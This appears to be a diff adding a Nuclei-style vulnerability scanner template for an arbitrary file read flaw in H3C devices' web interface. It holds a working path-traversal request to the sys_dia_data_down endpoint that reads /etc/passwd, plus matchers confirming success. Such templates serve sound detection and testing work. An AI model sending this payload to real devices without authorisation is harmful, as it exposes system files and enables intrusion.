@@ -1,0 +1,33 @@
+id: h3c-sys-dia-data-down-file-read
+info:
+  name: H3C sys_dia_data_down Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+        condition: and
